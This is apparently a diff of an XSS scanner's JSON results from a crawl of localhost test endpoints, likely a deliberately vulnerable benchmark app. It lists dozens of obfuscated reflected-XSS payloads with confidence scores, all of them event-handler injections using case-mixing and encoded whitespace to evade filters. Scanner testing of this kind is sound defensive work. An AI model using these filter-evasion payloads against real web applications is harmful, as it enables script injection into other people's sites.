@@ -1,212 +1,212 @@
 [
     {
-        "url": "http://localhost:8080/xss/reflect/js_script_close",
+        "url": "http://localhost:8080/xss/reflect/textarea2_fp",
         "parameter": "in",
-        "payload": "<DETaILs%09onpoINTereNTER%0d=%0dconfirm()>",
+        "payload": "<detAIls%0aonToggle%0a=%0a(confirm)()%0dx>",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/onmouseover_unquoted_fp",
+        "parameter": "in",
+        "payload": "><htMl%0aOnmOUseOVer%09=%09(prompt)``%0dx//",
+        "confidence": 9,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/backslash1",
+        "parameter": "in",
+        "payload": "<A%0doNmOUseOVER+=+confirm()%0dx//v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/js4_dq",
         "parameter": "in",
-        "payload": "<D3V%0dOnPoIntEReNter%0a=%0aa=prompt,a()%0dx>v3dm0s",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/raw1",
-        "parameter": "in",
-        "payload": "<a%0aoNPOIntERenTER+=+(prompt)``//v3dm0s",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/js6_sq",
-        "parameter": "in",
-        "payload": "<D3V%09oNMoUseover%09=%09(confirm)()>v3dm0s",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/textarea2_fp",
-        "parameter": "in",
-        "payload": "<htML%0aOnpoinTErenTER%0d=%0d(prompt)``//",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/textarea1_fp",
-        "parameter": "in",
-        "payload": "<D3v%0aOnpointerenTER%0d=%0da=prompt,a()>v3dm0s",
+        "payload": "<html%09OnPoinTEReNTEr%0d=%0da=prompt,a()//",
         "confidence": 10,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/doubq1",
         "parameter": "in",
-        "payload": "<a%09onPoINtErENtER%0d=%0dconfirm()%0dx>v3dm0s",
+        "payload": "<A%0aOnPOiNtEreNteR%0a=%0aa=prompt,a()>v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
-        "url": "http://localhost:8080/xss/reflect/onmouseover_div_unquoted_fp",
+        "url": "http://localhost:8080/xss/reflect/textarea1_fp",
         "parameter": "in",
-        "payload": "><detAiLs/+/OnPoiNTerENTER%09=%09[8].find(confirm)>",
-        "confidence": 9,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/raw1_fp",
-        "parameter": "in",
-        "payload": "};a=prompt,a()//\\",
-        "confidence": 7,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/enc2_fp",
-        "parameter": "in",
-        "payload": "\\\";(prompt)``//",
-        "confidence": 6,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/textarea2",
-        "parameter": "in",
-        "payload": "<D3v%09ONpointerENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",
+        "payload": "<a%0aOnpointereNtEr%09=%09confirm()>v3dm0s",
         "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/backslash1",
-        "parameter": "in",
-        "payload": "<D3v/+/ONmOusEOVEr+=+confirm()%0dx//v3dm0s",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/js3_search_fp",
-        "parameter": "in",
-        "payload": "</TITLe><DEtaILs/+/OnPoiNTEreNTER%09=%09(confirm)()>",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/onmouseover_div_unquoted",
-        "parameter": "in",
-        "payload": "><hTML%0donMoUSeOvER%0a=%0a(confirm)()//",
-        "confidence": 9,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/js3_notags",
         "parameter": "in",
-        "payload": "<htMl%09OnpoiNTeREnTer%09=%09a=prompt,a()%0dx//",
+        "payload": "<HTML%09oNmOUSEovER%0a=%0a(prompt)``//",
         "confidence": 10,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/oneclick1",
         "parameter": "in",
-        "payload": "\\\"%0daUtoFoCus%0dOnfocUs=confirm()%0d\\\"",
+        "payload": "\\\"%0aAutoFOCUS%0aoNFoCUs=confirm()%0a\\\"",
         "confidence": 7,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/js6_sq_fp",
         "parameter": "in",
-        "payload": "\\\"%0aautOfOcUS%0aoNfocUs=[8].find(confirm)%0a\\\"",
+        "payload": "\\\"/+/AUtoFOcus/+/ONFoCUS=(confirm)()/+/\\\"",
         "confidence": 7,
         "mode": "crawl"
     },
     {
-        "url": "http://localhost:8080/xss/reflect/onmouseover_unquoted_fp",
+        "url": "http://localhost:8080/xss/reflect/full1",
         "parameter": "in",
-        "payload": "><D3v%09OnpOINtereNTer%0a=%0a(prompt)``>v3dm0s",
-        "confidence": 9,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/rs1",
-        "parameter": "in",
-        "payload": "<dEtAiLs%0donToGgle%09=%09confirm()//",
+        "payload": "<a%09OnPOinterenter%0a=%0a(confirm)()>v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
-        "url": "http://localhost:8080/xss/reflect/enc2",
+        "url": "http://localhost:8080/xss/reflect/textarea2",
         "parameter": "in",
-        "payload": "\\\";(prompt)``//",
-        "confidence": 6,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/js3",
-        "parameter": "in",
-        "payload": "<deTaILs/+/ONToGGLE%0d=%0dconfirm()%0dx>",
+        "payload": "<A/+/onmOUSEover%0a=%0aconfirm()%0dx>v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
-        "url": "http://localhost:8080/xss/reflect/textarea1",
+        "url": "http://localhost:8080/xss/reflect/js6_sq",
         "parameter": "in",
-        "payload": "<htML/+/oNPoIntEreNTeR+=+(confirm)()%0dx>",
+        "payload": "<d3V%0aonPOintErENTeR%0a=%0a[8].find(confirm)%0dx>v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
-        "url": "http://localhost:8080/xss/reflect/js3_notags_fp",
+        "url": "http://localhost:8080/xss/reflect/raw1",
         "parameter": "in",
-        "payload": "<hTmL%0dOnmouSeOVer%0d=%0dconfirm()>",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/js3_fp",
-        "parameter": "in",
-        "payload": "<hTmL/+/ONPOInTErEntER%0d=%0dconfirm()%0dx>",
+        "payload": "<d3V/+/OnMoUseOVeR%09=%09(confirm)()//v3dm0s",
         "confidence": 10,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/basic_in_tag",
         "parameter": "in",
-        "payload": "<html%09OnMOuSEOVeR%09=%09a=prompt,a()%0dx//",
+        "payload": "<DetailS%0dOnpOiNtEReNter%09=%09a=prompt,a()%0dx//",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js3_notags_fp",
+        "parameter": "in",
+        "payload": "<d3V/+/oNpoINTERENtER%0d=%0dconfirm()%0dx>v3dm0s",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/onmouseover_div_unquoted_fp",
+        "parameter": "in",
+        "payload": "><HTMl%0aonmoUsEOVER%0a=%0aa=prompt,a()%0dx//",
+        "confidence": 9,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/onmouseover",
+        "parameter": "in",
+        "payload": "\"><deTAiLS%0dONpoInTerenter%0a=%0a(prompt)``//",
+        "confidence": 9,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/onmouseover_div_unquoted",
+        "parameter": "in",
+        "payload": "><d3V%09OnpOINTeRenTeR+=+confirm()%0dx>v3dm0s",
+        "confidence": 9,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js3_fp",
+        "parameter": "in",
+        "payload": "<dETails%09onpoiNtErentEr%0d=%0d(confirm)()>",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/textarea1",
+        "parameter": "in",
+        "payload": "<htmL/+/OnMouSeovER+=+a=prompt,a()//",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/rs1",
+        "parameter": "in",
+        "payload": "<DetAILs%09OnToGGle%0d=%0d[8].find(confirm)//",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js3",
+        "parameter": "in",
+        "payload": "<deTaILs%0aONpOINTErEnTer%0d=%0da=prompt,a()%0dx>",
         "confidence": 10,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/js4_dq_fp",
         "parameter": "in",
-        "payload": "<dEtAILS%0doNpOInTErenTER%09=%09[8].find(confirm)//",
+        "payload": "<a%0aOnPoINtEReNteR%0a=%0a[8].find(confirm)>v3dm0s",
         "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/onmouseover",
-        "parameter": "in",
-        "payload": "\"><D3V%0aONmouSEOVer%09=%09confirm()%0dx>v3dm0s",
-        "confidence": 9,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/full1",
-        "parameter": "in",
-        "payload": "<A%09ONPoiNTerenter%09=%09[8].find(confirm)%0dx>v3dm0s",
-        "confidence": 10,
-        "mode": "crawl"
-    },
-    {
-        "url": "http://localhost:8080/xss/reflect/js6_sq_combo1",
-        "parameter": "in",
-        "payload": "\\\"%09aUToFocUS%09onFoCuS=[8].find(confirm)%09\\\"",
-        "confidence": 7,
         "mode": "crawl"
     },
     {
         "url": "http://localhost:8080/xss/reflect/onmouseover_unquoted",
         "parameter": "in",
-        "payload": "><d3v%0aoNmouseOVeR%0a=%0aconfirm()%0dx>v3dm0s",
+        "payload": "><D3v%09OnPOIntEREnteR%0d=%0d[8].find(confirm)>v3dm0s",
         "confidence": 9,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/raw1_fp",
+        "parameter": "in",
+        "payload": "};(prompt)``//\\",
+        "confidence": 7,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js3_search_fp",
+        "parameter": "in",
+        "payload": "</tITle><d3V%09onPoinTeREnTer+=+confirm()%0dx>v3dm0s",
+        "confidence": 10,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/enc2",
+        "parameter": "in",
+        "payload": "\\\";(confirm)()//",
+        "confidence": 6,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/enc2_fp",
+        "parameter": "in",
+        "payload": "\\\";(confirm)()//",
+        "confidence": 6,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js6_sq_combo1",
+        "parameter": "in",
+        "payload": "\\\"%0aautoFoCuS%0aoNfOCus=a=prompt,a()%0a\\\"",
+        "confidence": 7,
+        "mode": "crawl"
+    },
+    {
+        "url": "http://localhost:8080/xss/reflect/js_script_close",
+        "parameter": "in",
+        "payload": "<A/+/onmoUseoVER%0a=%0aconfirm()%0dx>v3dm0s",
+        "confidence": 10,
         "mode": "crawl"
     }
 ]
